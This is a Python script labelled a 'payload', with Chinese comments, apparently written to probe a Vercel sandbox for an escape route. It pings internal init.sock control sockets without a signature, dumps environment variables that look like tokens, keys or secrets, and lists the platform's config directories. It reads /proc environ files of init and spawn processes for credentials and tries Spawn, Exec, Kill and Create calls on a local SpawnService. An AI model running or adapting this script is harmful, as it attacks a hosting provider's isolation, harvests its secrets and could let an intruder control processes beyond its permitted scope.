# -*- coding: utf-8 -*-
"""v199 payload (sandbox user): init.sock SpawnService 签名材料调查
1. init.sock 可达性 + SpawnService.Ping (无签名)
2. 环境变量找 token/signature
3. /run/vercel/share /run/vercel /etc/vercel 配置
4. sandbox-init 进程 cmdline
5. 23456 SpawnService 方法枚举"""
import socket, time, json, os, subprocess, glob, sys

def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

def punix(sp, path, body, t=8):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

def post(port, path, body, t=8):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

# ============ 1: init.sock 可达性 ============
log('=== 1 init.sock ===')
for sp in ['/run/vercel/share/init.sock', '/run/init.sock', '/var/run/vercel/share/init.sock', '/vercel/sandbox/init.sock']:
    try:
        st = os.stat(sp)
        log('STAT %s mode=%o uid=%d gid=%d' % (sp, st.st_mode, st.st_uid, st.st_gid))
    except Exception as e:
        log('STAT %s EXC %s' % (sp, type(e).__name__))
    st, pay = punix(sp, '/vercel.sandbox.spawn.v1.SpawnService/Ping', {'name': 'x'}, t=4)
    log('PING %s -> %s %r' % (sp, st, pay[:300]))

# ============ 2: 环境变量 ============
log('=== 2 env ===')
for k, v in sorted(os.environ.items()):
    if any(x in k.lower() for x in ['token', 'key', 'secret', 'auth', 'sig', 'vercel', 'sandbox', 'api']):
        log('ENV %s=%s' % (k, (v[:200] if v else '')))

# ============ 3: 目录列表 ============
log('=== 3 dirs ===')
for d in ['/run/vercel', '/run/vercel/share', '/etc/vercel', '/var/run/vercel', '/vercel', '/vercel/sandbox']:
    try:
        fs = os.listdir(d)
        log('LS %s: %s' % (d, fs[:40]))
    except Exception as e:
        log('LS %s EXC %s' % (d, type(e).__name__))

# ============ 4: sandbox-init 进程 ============
log('=== 4 procs ===')
try:
    for pid in os.listdir('/proc'):
        if not pid.isdigit():
            continue
        try:
            cmdline = open('/proc/%s/cmdline' % pid, 'rb').read().replace(b'\x00', b' ').decode(errors='replace')
            if any(x in cmdline for x in ['sandbox-init', 'sandboxctrl', 'celld', 'init', 'spawn']):
                envf = '/proc/%s/environ' % pid
                try:
                    env = open(envf, 'rb').read().replace(b'\x00', b'\n').decode(errors='replace')
                    hits = [l for l in env.splitlines() if any(x in l.lower() for x in ['token', 'key', 'secret', 'auth', 'sig'])]
                except Exception:
                    hits = []
                log('PROC %s: %s ENVHITS=%s' % (pid, cmdline[:200], hits[:5]))
        except Exception:
            pass
except Exception as e:
    log('PROC EXC %s' % e)

# ============ 5: 23456 SpawnService 方法 ============
log('=== 5 23456 spawn svc ===')
for m in ['Ping', 'Kill', 'Spawn', 'Start', 'Exec', 'Create']:
    st, pay = post(23456, '/vercel.sandbox.api.spawn.v1.SpawnService/%s' % m, {'name': 'x'}, t=4)
    log('23456 SPAWN %s -> %s %r' % (m, st, pay[:200]))

log('V199_DONE')
